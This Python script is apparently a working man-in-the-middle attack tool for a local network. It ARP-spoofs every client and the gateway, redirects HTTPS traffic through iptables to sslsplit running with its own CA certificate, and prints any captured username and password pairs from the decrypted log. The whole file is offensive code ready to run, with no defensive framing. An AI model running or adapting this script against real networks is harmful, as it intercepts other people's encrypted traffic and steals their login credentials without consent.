#!/usr/bin/env python3

import re
import shlex
import time
from contextlib import contextmanager
from io import SEEK_END
from multiprocessing import Process
from pathlib import Path
from subprocess import DEVNULL, Popen

import arp

CREDENTIALS_PATTERN = re.compile(r"username=([^&]+)&password=([^&]+)")


def parse_secret(log_file: Path):
    log_file.touch()

    with log_file.open(errors="ignore") as f:
        f.seek(0, SEEK_END)
        while True:
            line = f.readline().strip()
            if line == "":
                time.sleep(0.5)
                continue

            match = CREDENTIALS_PATTERN.search(line)
            if match:
                print(f"Username: {match.group(1)}")
                print(f"Password: {match.group(2)}")


@contextmanager
def sslsplit(log_file: Path):
    """Starts sslsplit"""

    cmd = f"sslsplit -D -L {log_file} -k ca.key -c ca.crt ssl 0.0.0.0 8443"

    with Popen(shlex.split(cmd), stdout=DEVNULL, stderr=DEVNULL) as proc:
        try:
            yield proc
        finally:
            pass


@contextmanager
def secret_reader(log_file: Path):
    """Starts a new process that reads the log file for secrets"""

    proc = Process(target=parse_secret, args=(log_file,))
    proc.start()
    try:
        yield proc
    finally:
        proc.terminate()


def main():
    arp.run_silently("sysctl -w net.ipv4.ip_forward=1")
    arp.run_silently("iptables -t nat --flush")
    arp.run_silently(
        "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443"
    )

    clients, gateway_ip, gateway_mac = arp.arp_scan()
    arp.print_clients(clients)
    arp.spoof_all(clients, gateway_ip, gateway_mac)

    try:
        log_file = Path("mitm.log")
        with sslsplit(log_file), secret_reader(log_file):
            arp.keep_spoof(clients, gateway_ip, gateway_mac, 10)
    except KeyboardInterrupt:
        pass
    finally:
        print("shutting down gracefully...")

        arp.run_silently("iptables -t nat --flush")


if __name__ == "__main__":
    main()
